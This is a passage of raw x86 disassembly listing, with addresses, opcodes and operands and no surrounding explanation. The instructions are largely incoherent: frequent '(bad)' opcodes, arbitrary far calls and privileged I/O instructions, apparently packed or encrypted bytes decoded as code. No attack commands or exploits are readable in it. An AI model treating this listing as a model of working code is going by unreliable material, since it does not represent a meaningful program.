  40eab2:	jge    0x40ea49
  40eab4:	nop
  40eab5:	ins    DWORD PTR es:[edi],dx
  40eab6:	adc    eax,0xb9475bb5
  40eabb:	rcl    ch,1
  40eabd:	adc    edx,DWORD PTR [ebx+0x65]
  40eac0:	lahf   
  40eac1:	mov    esp,0x3772364a
  40eac6:	pusha  
  40eac7:	or     al,0x14
  40eac9:	xor    BYTE PTR [ecx+edx*2],al
  40eacc:	test   ch,dh
  40eace:	pop    esp
  40eacf:	and    edx,DWORD PTR [esp+esi*4-0x6a]
  40ead3:	fidiv  WORD PTR ds:0xd4dea607
  40ead9:	sbb    eax,0x81d11858
  40eade:	aas    
  40eadf:	cs (bad) 
  40eae1:	scas   eax,DWORD PTR es:[edi]
  40eae2:	or     WORD PTR [ecx-0x29],ax
  40eae6:	or     bl,bh
  40eae8:	or     al,0xd9
  40eaea:	cmp    esi,DWORD PTR [edx-0x65]
  40eaed:	shr    edx,1
  40eaef:	inc    esp
  40eaf0:	outs   dx,DWORD PTR ds:[esi]
  40eaf1:	xor    al,0xb0
  40eaf3:	not    BYTE PTR [esi+ecx*8]
  40eaf6:	adc    al,bl
  40eaf8:	sbb    eax,0x8974b4ed
  40eafd:	or     bh,BYTE PTR [ebp-0xc]
  40eb00:	outs   dx,DWORD PTR ds:[esi]
  40eb01:	lods   al,BYTE PTR ds:[esi]
  40eb02:	mov    bl,0x3a
  40eb04:	fcmove st,st(2)
  40eb06:	daa    
  40eb07:	(bad)  
  40eb08:	addr16 enter 0x1203,0x67
  40eb0d:	xchg   esi,eax
  40eb0e:	pop    ebp
  40eb0f:	mov    ah,0x71
  40eb11:	pop    ecx
  40eb12:	mov    es,WORD PTR [edx-0x5e]
  40eb15:	sbb    al,BYTE PTR [eax*8-0x16587d5f]
  40eb1c:	push   esp
  40eb1d:	jg     0x40eb98
  40eb1f:	call   0xbf8a:0x57ab9125
  40eb26:	jnp    0x40eb3e
  40eb28:	push   cs
  40eb29:	and    esi,ebp
  40eb2b:	pop    ds
  40eb2c:	xor    ecx,DWORD PTR [ebx]
  40eb2e:	jge    0x40eb69
  40eb30:	ficomp WORD PTR [ebx-0x8]
  40eb33:	(bad)  [ecx]
  40eb35:	test   DWORD PTR [edx-0x47],eax
  40eb38:	jl     0x40eb8d
  40eb3a:	dec    edx
  40eb3b:	mov    esp,0xbea67644
  40eb40:	mov    ch,cl
  40eb42:	push   cs
  40eb43:	retf   0x774a
  40eb46:	inc    ecx
  40eb47:	add    bh,BYTE PTR [edi+ebp*8-0xed576fb]
  40eb4e:	popf   
  40eb4f:	jb     0x40eb9a
  40eb51:	push   ecx
  40eb52:	fld    TBYTE PTR [edx+0x1b]
  40eb55:	cmp    DWORD PTR [esi],edi
  40eb57:	pop    edi
  40eb58:	(bad)  
  40eb59:	(bad)  
  40eb5a:	ins    DWORD PTR es:[edi],dx
  40eb5b:	cmc    
  40eb5c:	sbb    eax,0xd5637a96
  40eb61:	mov    al,ds:0x4b7d66a8
  40eb66:	jne    0x40eba8
  40eb68:	lea    esp,[ecx+0x61]
  40eb6b:	add    DWORD PTR [ebx-0x15f01a41],ecx
  40eb71:	cs dec eax
  40eb73:	dec    ecx
  40eb74:	jmp    0xa0ce:0x133912db
  40eb7b:	dec    ebp
  40eb7c:	ins    DWORD PTR es:[edi],dx
  40eb7d:	ss hlt 
  40eb7f:	inc    edi
  40eb80:	cmp    eax,0x35202225
  40eb85:	(bad)  
  40eb86:	cmp    al,0xf0
  40eb88:	out    0x6,eax
  40eb8a:	xchg   DWORD PTR [esi+edi*2+0x18],ebp
  40eb8e:	push   es
  40eb8f:	add    eax,0x42ec34b3
  40eb94:	test   BYTE PTR [edi],dl
  40eb96:	xchg   ebx,eax
  40eb97:	or     BYTE PTR [edi+0x21d8d13b],bl
  40eb9d:	xlat   BYTE PTR ds:[ebx]
  40eb9e:	sbb    cl,ah
  40eba0:	fptan  
  40eba2:	adc    bl,ah
  40eba4:	rcr    DWORD PTR [edi-0x80b0661],1
  40ebaa:	pop    ecx
  40ebab:	je     0x40ebd3
  40ebad:	jl     0x40ebf8
  40ebaf:	mov    esp,esi
  40ebb1:	xor    eax,0x491d330
  40ebb6:	inc    edx
  40ebb7:	aas    
  40ebb8:	mov    DWORD PTR [ebx+0x0],eax
  40ebbb:	xchg   eax,ecx
  40ebbd:	mov    ebp,DWORD PTR [ecx+0x8]
  40ebc0:	cwde   
  40ebc1:	(bad)  
  40ebc2:	aad    0x61
  40ebc4:	pop    ebx
  40ebc5:	cld    
  40ebc6:	cld    
  40ebc7:	xor    BYTE PTR [ebx+0x25],0x6d
  40ebcb:	pop    ebx
  40ebcc:	mov    ebp,0x35d43c72
  40ebd2:	cwde   
  40ebd3:	popf   
  40ebd4:	or     eax,0xd301ada5
  40ebd9:	push   ds
  40ebda:	gs call 0xe956:0xc3fb188b
  40ebe2:	mov    bl,0x3f
  40ebe4:	jl     0x40ebbe
  40ebe6:	mov    ecx,0x3ee093a7
  40ebeb:	jbe    0x40ec61
  40ebed:	cmp    ebp,ecx
  40ebef:	into   
  40ebf0:	mov    dh,0x27
  40ebf2:	leave  
  40ebf3:	dec    edx
  40ebf4:	sbb    al,0xb3
  40ebf6:	cmp    al,0x1
  40ebf8:	(bad)  
  40ebf9:	cli    
  40ebfa:	and    ebp,DWORD PTR ds:0x363559d0
  40ec00:	sahf   
  40ec01:	pop    eax
  40ec02:	(bad)
  40ec05:	sbb    dl,BYTE PTR [edi-0x136e35da]
  40ec0b:	lea    eax,[edi+0x8973f17]
  40ec11:	cmp    ebx,ecx
  40ec13:	xor    eax,0xcb8c3fc3
  40ec18:	or     ebp,DWORD PTR [ebx+ebx*8+0x25]
  40ec1c:	and    BYTE PTR [ebp+ebp*4+0x49],bl
  40ec20:	sub    DWORD PTR [edi],0xffffffd3
  40ec23:	sbb    BYTE PTR [ecx+edi*4],dl
  40ec26:	mov    edx,0x82e28e7c
  40ec2b:	mov    ?,WORD PTR [eax]
  40ec2d:	push   0x3bbfc9f4
  40ec32:	mov    dl,0x11
  40ec34:	mov    al,ds:0xcd8c9bfd
  40ec39:	(bad)  
  40ec3a:	fldenv [ecx+0x38]
  40ec3d:	fsub   QWORD PTR [edx-0x7411a114]
  40ec43:	dec    esi
  40ec44:	jns    0x40ec44
  40ec46:	repz or BYTE PTR [ecx],bl
  40ec49:	add    DWORD PTR [eax-0x70],eax
  40ec4c:	mov    ebx,?
  40ec4e:	jns    0x40ebee
  40ec50:	sub    bl,dh
  40ec52:	test   BYTE PTR [ebx-0x35121bcf],ah
  40ec58:	lods   al,BYTE PTR ds:[esi]
  40ec59:	inc    edi
  40ec5a:	sbb    esp,DWORD PTR [ecx]
  40ec5c:	pop    ss
  40ec5d:	push   ebx
  40ec5e:	dec    eax
  40ec5f:	mov    ch,0x96
  40ec61:	mov    WORD PTR [esi+esi*4-0x9e6470d],ss
  40ec68:	arpl   WORD PTR [ebx+0x61eff8cc],bx
  40ec6e:	mov    eax,ds:0x8b29681a
  40ec73:	mov    dl,0x50
  40ec75:	mov    ecx,0xddbbe49b
  40ec7a:	jmp    0x9609:0xf0d4f94c
  40ec81:	push   0xffffffdb
  40ec83:	cli    
  40ec84:	push   eax
  40ec85:	rcl    edi,0x7e
  40ec88:	sub    edx,DWORD PTR [edx+0x2e]
  40ec8b:	mov    ebx,0x49fe75a4
  40ec90:	sbb    edi,DWORD PTR [esi-0x6e]
  40ec93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec94:	jb     0x40ec69
  40ec96:	dec    ecx
  40ec98:	(bad)  
  40ec99:	mov    dh,0x1f
  40ec9b:	out    dx,eax
  40ec9c:	push   edx
  40ec9d:	add    eax,0x85e7996
  40eca2:	push   ebp
  40eca3:	(bad)  
  40eca4:	pop    ebx
  40eca5:	mov    esp,DWORD PTR [ebx+0x2d39b236]
  40ecab:	dec    edx
  40ecac:	jb     0x40ed0d
  40ecae:	dec    ebx
  40ecaf:	push   ebp
  40ecb0:	jmp    0x40ec59
  40ecb2:	mov    ecx,0x90bee5b7
  40ecb7:	mov    ecx,?
  40ecb9:	fwait
  40ecba:	retf   0xc2d0
  40ecbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecbe:	push   ecx
  40ecbf:	aam    0x86
  40ecc1:	and    DWORD PTR [esi+0x273e38aa],esp
  40ecc7:	loopne 0x40ecc2
  40ecc9:	mov    ds:0xd4d8229f,eax
  40ecce:	add    edi,DWORD PTR [edi]
  40ecd0:	enter  0x2e26,0xe5
  40ecd4:	mov    ecx,0xddfce3df
  40ecd9:	es pop edi
  40ecdb:	xchg   ebx,eax
  40ecdc:	loope  0x40ecec
  40ecde:	mov    eax,0x687278ed
  40ece3:	cmp    ebp,DWORD PTR [esi+esi*1+0x2c]
  40ece7:	aas    
  40ece8:	pop    edi
  40ece9:	iret   
  40ecea:	jbe    0x40ec82
  40ecec:	lahf   
  40eced:	aam    0x8e
  40ecef:	push   edx
  40ecf0:	fisttp QWORD PTR [eax-0x6c]
  40ecf3:	inc    eax
  40ecf4:	iret   
  40ecf5:	in     al,0x80
  40ecf7:	push   0x19b755ec
  40ecfc:	sbb    dl,dl
  40ecfe:	loop   0x40ed28
  40ed00:	push   cs
  40ed01:	sti    
  40ed02:	gs aaa 
  40ed04:	xlat   BYTE PTR ds:[ebx]
  40ed05:	int    0xa
  40ed07:	push   0x20538807
  40ed0c:	aas    
  40ed0d:	cmp    eax,0xbcfbd012
  40ed12:	sub    ah,cl
  40ed14:	(bad)  
  40ed15:	fs (bad) 
  40ed17:	retf   0xd51d
  40ed1a:	adc    eax,0x118be9a9
  40ed1f:	jmp    0x40ecaf
  40ed21:	xor    ch,BYTE PTR [eax+0x14]
  40ed24:	cmp    al,0xd6
  40ed26:	mov    dh,0x66
  40ed28:	pop    eax
  40ed29:	pusha  
  40ed2a:	rcr    DWORD PTR es:[edi-0x50],0xc
  40ed2f:	(bad)  [edx]
  40ed31:	fsubp  st(1),st
  40ed33:	pop    ds
  40ed34:	pushf  
  40ed35:	push   ebp
  40ed36:	mov    dh,0x73
  40ed38:	dec    ecx
  40ed39:	aam    0x7c
  40ed3b:	inc    esp
  40ed3c:	test   BYTE PTR [ebp-0x1c7b0611],0x83
  40ed43:	sub    cl,ah
  40ed45:	sar    eax,0x11
  40ed48:	jo     0x40ed7b
  40ed4a:	sti    
  40ed4b:	inc    esp
  40ed4c:	inc    esi
  40ed4d:	jg     0x40ecdf
  40ed4f:	and    cl,ah
  40ed51:	fisub  WORD PTR [eax-0x5a]
  40ed54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed55:	fiadd  WORD PTR [ebx+ebp*2]
  40ed58:	adc    eax,0xe43abc80
  40ed5d:	xor    BYTE PTR [ecx-0x39],bl
  40ed60:	mov    ebp,0x7f4aa92c
  40ed65:	daa    
  40ed66:	loop   0x40edb8
  40ed68:	push   esp
  40ed69:	pop    esp
  40ed6a:	fst    st(5)
  40ed6c:	inc    esi
  40ed6d:	xchg   edx,eax
  40ed6e:	(bad)  
  40ed6f:	repnz inc eax
  40ed71:	dec    esi
  40ed72:	daa    
  40ed73:	test   DWORD PTR [ebx-0xa10b5a4],0x3173b3c0
  40ed7d:	jmp    0x40ed80
  40ed7f:	repnz push esi
  40ed81:	cmp    bl,BYTE PTR [edi+eax*1+0x6f]
  40ed85:	pop    es
  40ed86:	cli    
  40ed87:	and    DWORD PTR [edx+0x7034f900],ebp
  40ed8d:	xor    cl,ch
  40ed8f:	popa   
  40ed90:	dec    esi
  40ed91:	popa   
  40ed92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed93:	push   ebx
  40ed94:	shr    ebp,1
  40ed96:	lock lods al,BYTE PTR ds:[esi]
  40ed98:	in     al,dx
  40ed99:	(bad)  
  40ed9a:	mov    ah,0xb1
  40ed9c:	aam    0x73
  40ed9e:	std    
  40ed9f:	out    0xf7,al
  40eda1:	stos   DWORD PTR es:[edi],eax
  40eda2:	adc    DWORD PTR [ebp-0x6],ecx
  40eda5:	repz mov dh,0xc8
  40eda8:	jns    0x40edf2
  40edaa:	shl    cl,cl
  40edac:	pop    esi
  40edad:	xchg   ebx,eax
  40edae:	lods   al,BYTE PTR ds:[esi]
  40edaf:	(bad)  
  40edb0:	loope  0x40edc6
  40edb2:	popa   
  40edb3:	pop    edi
  40edb4:	mov    cl,0x24
  40edb6:	jo     0x40ed91
  40edb8:	repnz or al,0x0
  40edbb:	cs jnp 0x40ee00
  40edbe:	sar    DWORD PTR [edx],cl
  40edc0:	retf   0x8bb8
  40edc3:	pop    esp
  40edc4:	add    esi,esi
  40edc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edc7:	inc    ebx
  40edc8:	fwait
  40edc9:	std    
  40edca:	fld    TBYTE PTR ds:0xd9bbc645
  40edd0:	mov    esi,esp
  40edd2:	enter  0xf9fc,0x8c
  40edd6:	fdivp  st(2),st
  40edd8:	test   BYTE PTR [edi+edi*1],al
  40eddb:	test   eax,0xcff1f24e
  40ede0:	push   ss
  40ede1:	(bad)  
  40ede2:	jg     0x40edce
  40ede4:	pusha  
  40ede5:	es add ecx,ebx
  40ede8:	arpl   WORD PTR [ecx],di
  40edea:	test   ebp,esi
  40edec:	xchg   esp,eax
  40eded:	pop    edi
  40edee:	das    
  40edef:	jbe    0x40ee70
  40edf1:	test   eax,0xec0df076
  40edf6:	sbb    al,0xa5
  40edf8:	mov    ds:0x464aa5f6,al
  40edfd:	sbb    al,bh
  40edff:	or     BYTE PTR [edi-0x1758b1a2],cl
  40ee05:	cmp    DWORD PTR [edi-0x49942c81],0xffffff8b
  40ee0c:	jge    0x40ee62
  40ee0e:	shl    dl,1
  40ee10:	add    cl,BYTE PTR [edx+0x41]
  40ee13:	in     al,0x9a
  40ee15:	fs pop ebp
  40ee17:	sub    ecx,DWORD PTR [esi]
  40ee19:	or     BYTE PTR [eax*1-0x1ee26a07],bl
  40ee20:	aas    
  40ee21:	(bad)  
  40ee22:	xchg   edx,eax
  40ee23:	aaa    
  40ee24:	xchg   esi,eax
  40ee25:	outs   dx,BYTE PTR ds:[esi]
  40ee26:	push   ecx
  40ee27:	inc    esi
  40ee28:	sub    BYTE PTR [esi-0xb57ee34],al
  40ee2e:	cwde   
  40ee2f:	je     0x40ee61
  40ee31:	push   ds
  40ee32:	fwait
  40ee33:	stos   BYTE PTR es:[edi],al
  40ee34:	arpl   WORD PTR [edx-0xc],di
  40ee37:	adc    edx,DWORD PTR [ecx+edi*1+0x2f]
  40ee3b:	mov    al,ds:0x4893714
  40ee40:	push   ebx
  40ee41:	psrld  mm1,QWORD PTR [eax+0x4f]
  40ee45:	(bad)  
  40ee46:	int3   
  40ee47:	adc    BYTE PTR [eax+0x5a],dl
  40ee4a:	add    al,0x3f
  40ee4c:	pop    edi
  40ee4d:	pop    ds
  40ee4e:	xchg   ebp,eax
  40ee4f:	pop    ebp
  40ee50:	jnp    0x40ee42
  40ee52:	mov    ebx,DWORD PTR [edi]
  40ee54:	mov    ch,0x13
  40ee56:	mov    ecx,0xd93dbe92
  40ee5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee5c:	mov    DWORD PTR [esi],ebx
  40ee5e:	enter  0xabb6,0x5b
  40ee62:	enter  0xc5,0xab
  40ee66:	sub    DWORD PTR [edi],edx
  40ee68:	mov    cl,0xd7
  40ee6a:	lds    esp,FWORD PTR [esp+ecx*4+0x42]
  40ee6e:	fwait
  40ee6f:	add    DWORD PTR [edi],0x4f
  40ee72:	ret    0xb8dc
  40ee75:	(bad)  
  40ee76:	mov    ebx,0x3645e1ef
  40ee7b:	mov    esi,ecx
  40ee7d:	or     dh,ch
  40ee7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee80:	dec    ecx
  40ee81:	pushf  
  40ee82:	std    
  40ee83:	stc    
  40ee84:	(bad)  
  40ee85:	cmp    eax,0xd0dc6b74
  40ee8a:	jne    0x40eed2
  40ee8c:	add    ecx,0xe78e468a
  40ee92:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee94:	sbb    BYTE PTR [esi],bh
  40ee96:	jl     0x40eefc
  40ee98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee99:	jnp    0x8613089
  40ee9f:	and    DWORD PTR [eax],edi
  40eea1:	out    dx,al
  40eea2:	dec    edi
  40eea3:	xor    al,0x29
  40eea5:	or     bl,BYTE PTR [ebp-0x4a]
  40eea8:	ja     0x40ef24
  40eeaa:	test   DWORD PTR [esi+0x58],edx
  40eead:	(bad)  
  40eeae:	ins    DWORD PTR es:[edi],dx
  40eeaf:	dec    eax
  40eeb0:	jnp    0x40ee8c
  40eeb2:	mov    BYTE PTR [edx-0x441688da],al
  40eeb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eeb9:	inc    edx
  40eeba:	test   BYTE PTR [ecx-0x649ecc45],cl
  40eec0:	test   DWORD PTR [ebx],ebp
  40eec2:	inc    ebp
  40eec3:	add    ah,al
  40eec5:	(bad)  
  40eec6:	ins    BYTE PTR es:[edi],dx
  40eec7:	into   
  40eec8:	bound  ecx,QWORD PTR [edx-0x64]
  40eecb:	mov    ah,0x82
  40eecd:	pushf  
  40eece:	inc    ebx
  40eecf:	rol    BYTE PTR [eax+edx*2+0x14d6d9d1],1
  40eed6:	lods   eax,DWORD PTR ds:[esi]
  40eed7:	fld    DWORD PTR [edi-0x74]
  40eeda:	aas    
  40eedb:	aad    0x4f
  40eedd:	pop    ecx
  40eede:	mov    dl,0x44
  40eee0:	push   es
  40eee1:	xchg   BYTE PTR [edx+ebp*8+0x23],dl
  40eee5:	fisttp DWORD PTR [eax-0x21]
  40eee8:	call   0x51ff:0xa3220e0c
  40eeef:	rcl    DWORD PTR [edx+edi*4+0x246fc509],cl
  40eef6:	popf   
  40eef7:	data16 jns 0x40ef03
  40eefa:	mov    cl,0x1c
  40eefc:	call   0x13c6:0x236aa071
  40ef03:	add    dl,BYTE PTR [ecx+0x56e06639]
  40ef09:	sbb    al,0xa1
  40ef0b:	dec    edi
  40ef0c:	and    ah,BYTE PTR [ebp-0x3bfde2ee]
  40ef12:	nop
  40ef13:	test   DWORD PTR [ebp-0x757f504f],ebp
  40ef19:	jae    0x40ef55
  40ef1b:	push   esi
  40ef1c:	mov    ss,WORD PTR [ecx+0x4e4767f0]
  40ef22:	sub    eax,0xf34217df
  40ef27:	cmc    
  40ef28:	inc    ebx
  40ef29:	adc    bh,BYTE PTR [esi]
  40ef2b:	cmp    DWORD PTR [ecx-0x119bde7f],ebp
  40ef31:	and    DWORD PTR [ebp+0x30b05a93],ebp
  40ef37:	push   edi
  40ef38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef39:	xlat   BYTE PTR ds:[ebx]
  40ef3a:	repnz adc edi,DWORD PTR [bx+di+0x3f0a]
  40ef40:	clc    
  40ef41:	pusha  
  40ef42:	mov    ebp,0xe2298abd
  40ef47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef48:	xor    BYTE PTR [eax+0x21],ch
  40ef4b:	cs pusha 
  40ef4d:	mov    eax,ds:0x89275db
  40ef52:	setl   BYTE PTR [ebp-0x5371dde1]
  40ef59:	jecxz  0x40ef43
  40ef5b:	and    DWORD PTR [ecx],edx
  40ef5d:	mov    dl,0x27
  40ef5f:	or     eax,0x9b6f1d75
  40ef64:	(bad)  
  40ef65:	sti    
  40ef66:	(bad)  
  40ef67:	aad    0xd3
  40ef69:	mov    edi,DWORD PTR [ebx-0x5a77bbf8]
  40ef6f:	out    0x7e,al
  40ef71:	int    0x45
  40ef73:	jo     0x40ef7a
  40ef75:	div    ch
  40ef77:	xor    ecx,ebp
  40ef79:	(bad)  
  40ef7a:	sbb    al,0xa8
  40ef7c:	sub    ch,BYTE PTR [esi]
  40ef7e:	mov    edi,0x2d785319
  40ef83:	retf   0xe54f
  40ef86:	shl    DWORD PTR [ebx+0xdaeffe0],0x57
  40ef8d:	dec    esp
  40ef8e:	xchg   ebp,eax
  40ef8f:	scas   eax,DWORD PTR es:[edi]
  40ef90:	lock scas al,BYTE PTR es:[edi]
  40ef92:	mov    ecx,0x49d88972
  40ef97:	lds    edi,FWORD PTR [esi-0x3b]
  40ef9a:	push   eax
  40ef9b:	xchg   edx,eax
  40ef9c:	cld    
  40ef9d:	mov    dh,0x98
  40ef9f:	mov    esi,0x7e2fada
  40efa4:	nop
  40efa5:	cld    
  40efa6:	xchg   ecx,eax
  40efa7:	in     eax,dx
  40efa8:	adc    BYTE PTR [ebp+0x28f929ab],cl
  40efae:	push   0x9c7a0405
  40efb3:	sub    BYTE PTR [ebp-0x6b3b3054],bh
  40efb9:	repz imul ebx,DWORD PTR [edi-0x15],0x42
  40efbe:	repz div BYTE PTR [edx-0x541fcc2c]
  40efc5:	mov    ecx,0x8f54908f
  40efca:	lahf   
  40efcb:	aaa    
  40efcc:	push   0xe63a710a
  40efd1:	outs   dx,DWORD PTR ds:[esi]
  40efd2:	fcom   QWORD PTR [ebp-0x35]
  40efd5:	xchg   ebp,eax
  40efd6:	mov    BYTE PTR [ebp-0x765be99f],al
  40efdc:	dec    esp
  40efdd:	leave  
  40efde:	mov    eax,0x8f253e42
  40efe3:	and    BYTE PTR [esi+0x41],dl
  40efe6:	das    
  40efe7:	js     0x40ef9d
  40efe9:	pop    es
  40efea:	in     al,dx
  40efeb:	push   esi
  40efec:	ret    0x83ba
  40efef:	jbe    0x40f069
  40eff1:	inc    esp
  40eff2:	mov    ecx,0x1eed97b1
  40eff7:	push   edi
  40eff8:	xchg   edi,eax
  40eff9:	jns    0x40f064
  40effb:	inc    ecx
  40effc:	cdq    
  40effd:	mov    ch,0x24
  40efff:	loopne 0x40f018
  40f001:	in     al,0x24
  40f003:	push   eax
  40f004:	sahf   
  40f005:	scas   al,BYTE PTR es:[edi]
  40f006:	fwait
  40f007:	pushf  
  40f008:	es inc edi
  40f00a:	mov    ebx,0x3f1ed5e1
  40f00f:	test   eax,0x235b070b
  40f014:	and    BYTE PTR [ecx+0x27],cl
  40f017:	adc    eax,0xec7f247d
  40f01c:	jle    0x40f00a
  40f01e:	sub    eax,0x154b8eda
  40f023:	loopne 0x40efe2
  40f025:	gs iret 
  40f027:	mov    edx,DWORD PTR [edi+0x3e48ff29]
  40f02d:	hlt    
  40f02e:	out    dx,al
  40f02f:	gs mov cl,0x58
  40f032:	bound  eax,QWORD PTR [edx+0x65]
  40f035:	sub    cl,ah
  40f037:	inc    eax
  40f038:	mov    ds:0x940e5604,al
  40f03d:	addr16 in eax,0x94
  40f040:	and    eax,0x66986f41
  40f045:	push   edi
  40f046:	xchg   BYTE PTR ds:0xe5af866a,ah
  40f04c:	out    0x96,eax
  40f04e:	and    esp,esp
  40f050:	pop    ebx
  40f051:	test   BYTE PTR [edx+0x60],0x5c
  40f055:	push   ds
  40f056:	cmp    edi,DWORD PTR [edx+edx*1+0x2503645d]
  40f05d:	dec    esp
  40f05e:	pop    ecx
  40f05f:	fsub   st(3),st
  40f061:	cmp    cl,BYTE PTR [edx+0x7f]
  40f064:	nop
  40f065:	fadd   QWORD PTR [edx+0xa97d239]
  40f06b:	rcl    esp,1
  40f06d:	mov    eax,ds:0x30aa6143
  40f072:	xor    ecx,DWORD PTR [ecx-0x41dd7520]
  40f078:	mov    al,0xe8
  40f07a:	int3   
  40f07b:	or     al,ah
  40f07d:	in     al,dx
  40f07e:	scas   eax,DWORD PTR es:[edi]
  40f07f:	(bad)  
  40f080:	mov    al,ds:0x539a86f8
  40f085:	packuswb mm0,QWORD PTR [edi]
  40f088:	in     al,dx
  40f089:	xor    al,0x30
  40f08b:	aaa    
  40f08c:	or     BYTE PTR [eax-0x1b00f3f2],0x90
  40f093:	and    ebx,DWORD PTR [esi-0x5149160f]
  40f099:	mov    ecx,0x61b4c14a
  40f09e:	(bad)  
  40f09f:	dec    DWORD PTR [edx-0x63ac1fe3]
  40f0a5:	jmp    0x2d4:0xb6884b2f
  40f0ac:	and    al,0x5d
  40f0ae:	lds    ebp,FWORD PTR [ebp+0x3bcac29]
  40f0b4:	pop    ss
  40f0b5:	jbe    0x40f07b
  40f0b7:	dec    edi
  40f0b8:	dec    esp
  40f0b9:	cmp    eax,0xcf2badfe
  40f0be:	pop    ds
  40f0bf:	jne    0x40f095
  40f0c1:	xchg   edi,eax
  40f0c2:	shr    BYTE PTR [ebp+0x79a0186c],1
  40f0c8:	xor    al,BYTE PTR [ecx-0x422e6eb4]
  40f0ce:	stc    
  40f0cf:	arpl   WORD PTR [ecx-0x6782eef5],ax
  40f0d5:	loop   0x40f122
  40f0d7:	fadd   st(1),st
  40f0d9:	push   ecx
  40f0da:	push   ss
  40f0db:	or     ch,BYTE PTR [ebp+eax*4-0x36]
  40f0df:	push   DWORD PTR [edx+0x17]
  40f0e2:	arpl   sp,ax
  40f0e4:	fucom  st(5)
  40f0e6:	iret   
  40f0e7:	adc    al,ch
  40f0e9:	aas    
  40f0ea:	fisub  DWORD PTR [eax]
  40f0ec:	jecxz  0x40f166
  40f0ee:	pop    ds
  40f0ef:	ficomp WORD PTR [ecx-0x4f46764d]
  40f0f5:	aas    
  40f0f6:	das    
  40f0f7:	sbb    al,0xfa
  40f0f9:	pop    esp
  40f0fa:	fs cmc 
  40f0fc:	lods   eax,DWORD PTR ds:[esi]
  40f0fd:	lods   al,BYTE PTR ds:[esi]
  40f0fe:	mov    cl,0x4a
  40f100:	jns    0x40f16f
  40f102:	mov    cl,0x30
  40f104:	rol    ch,1
  40f106:	jp     0x40f0b2
  40f108:	je     0x40f12a
  40f10a:	dec    edx
  40f10b:	das    
  40f10c:	push   edx
  40f10d:	(bad)  
  40f10e:	mov    ecx,0xadbcc656
  40f113:	lea    esp,[edx]
  40f115:	fwait
  40f116:	pop    edx
  40f117:	adc    eax,DWORD PTR [eax]
  40f119:	adc    DWORD PTR [edi+0x7b],edi
  40f11c:	cs out 0xb8,al
  40f11f:	ss adc al,0xc8
  40f122:	shr    BYTE PTR [ecx-0x5e],cl
  40f125:	or     dl,bh
  40f127:	rol    DWORD PTR [ebx+0x3e],0x7
  40f12b:	add    eax,edx
  40f12d:	jge    0x40f192
  40f12f:	clc    
  40f130:	loop   0x40f182
  40f132:	jne    0x40f0de
  40f134:	(bad)  
  40f135:	xlat   BYTE PTR ds:[ebx]
  40f136:	mov    al,ds:0x26ceba71
  40f13b:	cmp    DWORD PTR [ebp+0x75c75dc1],edi
  40f141:	jmp    0x8048:0x20c12f03
  40f148:	push   ebx
  40f149:	mov    ch,BYTE PTR [eax+eax*1+0x3bd75cf3]
  40f150:	arpl   WORD PTR [ecx+0x4b],si
  40f153:	sub    DWORD PTR [ebp-0x1d],edi
  40f156:	daa    
  40f157:	in     eax,dx
  40f158:	xor    DWORD PTR [eax],edi
  40f15a:	out    dx,eax
  40f15b:	inc    ebp
  40f15c:	xchg   esp,eax
  40f15d:	push   edi
  40f15e:	int3   
  40f15f:	and    BYTE PTR [esi],cl
  40f161:	mul    DWORD PTR [eax]
  40f163:	pop    es
  40f164:	mov    eax,ds:0x1275ecd2
  40f169:	jno    0x40f137
  40f16b:	fldenv cs:[eax-0xc]
  40f170:	ss and cl,al
  40f173:	aaa    
  40f174:	cmp    BYTE PTR [edi],cl
  40f176:	sub    BYTE PTR [ebx],bh
  40f178:	stos   DWORD PTR es:[edi],eax
  40f179:	pusha  
  40f17a:	cmp    BYTE PTR [eax],cl
  40f17c:	(bad)  
  40f17d:	(bad)  
  40f17f:	mov    al,0x15
  40f181:	call   0xcf7a:0xc0624339
  40f188:	test   BYTE PTR [edi],ch
  40f18a:	mov    ds:0xff8ae80d,al
  40f18f:	jnp    0x40f11e
  40f191:	hlt    
  40f192:	loope  0x40f123
  40f194:	jmp    0x40f202
  40f196:	in     eax,0x73
  40f198:	cmp    BYTE PTR [esi-0x69],0x6e
  40f19c:	icebp  
  40f19d:	vmulps ymm1,ymm0,YMMWORD PTR [ecx]
  40f1a1:	lods   al,BYTE PTR ds:[esi]
  40f1a2:	sub    edx,DWORD PTR [esi+ebp*8-0x2a]
  40f1a6:	outs   dx,DWORD PTR ds:[esi]
  40f1a7:	loop   0x40f1f6
  40f1a9:	adc    ecx,ebx
  40f1ab:	pushf  
  40f1ac:	add    BYTE PTR [edx+0x41],0xf4
  40f1b0:	sbb    cl,ch
  40f1b2:	mov    ch,0x44
  40f1b4:	jg     0x40f1d2
  40f1b6:	sub    BYTE PTR [ebp+0x5e323dfe],al
  40f1bc:	ss lahf 
  40f1be:	je     0x40f1e7
  40f1c0:	mov    BYTE PTR [esi+0x77],al
  40f1c3:	sbb    ebx,DWORD PTR [esi+ecx*2]
  40f1c6:	jne    0x40f219
  40f1c8:	ror    DWORD PTR [ebp+0x48],cl
  40f1cb:	rol    esi,0x74
  40f1ce:	pop    ebx
  40f1cf:	imul   dh
  40f1d1:	dec    edi
  40f1d2:	and    bh,ch
  40f1d4:	loopne 0x40f17c
  40f1d6:	shl    BYTE PTR [eax+0x48801fb6],cl
  40f1dc:	gs jmp 0xd1ea:0xdbee907e
  40f1e4:	imul   esp,DWORD PTR [ecx],0x471433f
  40f1ea:	sub    eax,DWORD PTR [edx+edx*4+0x23]
  40f1ee:	mov    bl,0x32
  40f1f0:	mov    edx,0xef6e5e82
  40f1f5:	repz push ecx
  40f1f7:	imul   ebp,esp,0xd3360dcd
  40f1fd:	sti    
  40f1fe:	push   esp
  40f1ff:	into   
  40f200:	mov    ebp,0x9149ea31
  40f205:	or     bh,ah
  40f207:	in     al,0xb5
  40f209:	jb     0x40f1c0
  40f20b:	jnp    0x40f26d
  40f20d:	push   es
